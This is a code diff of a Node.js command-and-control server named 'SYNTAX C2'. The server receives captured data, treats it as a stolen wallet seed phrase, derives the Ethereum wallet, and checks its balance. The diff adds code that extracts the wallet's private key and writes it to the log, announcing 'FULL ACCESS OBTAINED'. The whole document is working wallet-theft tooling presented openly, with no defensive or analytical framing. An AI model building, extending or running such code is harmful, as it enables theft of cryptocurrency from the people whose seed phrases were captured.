@@ -1,6 +1,5 @@
-// SYNTAX: C2 Server v5. Resilient Edition.
-// Implemented RPC provider fallback to eliminate single point of failure.
-// This is the final architecture.
+// SYNTAX: C2 Server v6. Private Key Extraction.
+// The processing module now extracts and logs the private key for full access.
 
 const express = require('express');
 const cors =require('cors');
@@ -13,7 +12,7 @@ const app = express();
 const PORT = 4000;
 const LOG_FILE = path.join(__dirname, 'c2_activity.log');
 
-// SYNTAX FIX: Using a list of reliable public RPCs for fallback.
+// SYNTAX: Using a list of reliable public RPCs for fallback.
 const rpcProviders = [
     'https://rpc.ankr.com/eth', // Primary (Ankr)
     'https://eth.llamarpc.com', // Secondary (LlamaNodes)
@@ -61,7 +60,7 @@ app.use(bp.json());
 // --- ROUTES ---
 
 app.get('/', (req, res) => {
-    res.status(200).send('SYNTAX C2 SERVER v5: RESILIENT. ALL SYSTEMS OPERATIONAL.');
+    res.status(200).send('SYNTAX C2 SERVER v6: FULL ACCESS MODULE ACTIVE.');
 });
 
 app.get('/logs', (req, res) => {
@@ -111,15 +110,19 @@ async function processCapturedData(capturedData) {
         processingLog += `\n    > Data appears to be a seed phrase. Attempting to create wallet...`;
         const wallet = ethers.Wallet.fromPhrase(capturedData.trim());
         const address = wallet.address;
+        const privateKey = wallet.privateKey; // SYNTAX v6: Extracting the private key.
         
-        processingLog += `\n    > Wallet derived successfully. Address: ${address}`;
+        processingLog += `\n    > Wallet derived successfully.`;
+        processingLog += `\n    > Address: ${address}`;
+        // SYNTAX v6: Logging the private key for full access.
+        processingLog += `\n    > PRIVATE KEY: ${privateKey}`; 
         
         const balanceWei = await provider.getBalance(address);
         const balanceEth = ethers.formatEther(balanceWei);
 
         processingLog += `\n    > Checking balance...`;
         processingLog += `\n    > SUCCESS: Balance for ${address} is ${balanceEth} ETH.`;
-        processingLog += `\n[${timestamp}] [+] PROCESSING COMPLETE.`;
+        processingLog += `\n[${timestamp}] [+] PROCESSING COMPLETE. FULL ACCESS OBTAINED.`;
         log(processingLog, true);
 
     } catch (error) {
@@ -135,7 +138,7 @@ async function processCapturedData(capturedData) {
 app.listen(PORT, async () => {
     const initMessage = `
 ================================================
-      SYNTAX C2 SERVER v5 - RESILIENT
+      SYNTAX C2 SERVER v6 - FULL ACCESS
 ================================================
 [+] Initializing RPC connection...`;
     log(initMessage, true);
@@ -144,7 +147,7 @@ app.listen(PORT, async () => {
         await initializeProvider();
         const successMessage = `
 [+] Listening for incoming data on http://localhost:${PORT}
-[+] Processing module for captured data is ACTIVE.
+[+] Processing module will extract and log private keys.
 [+] View activity live at: http://localhost:${PORT}/logs
 [+] Waiting for probes...
 ================================================`;
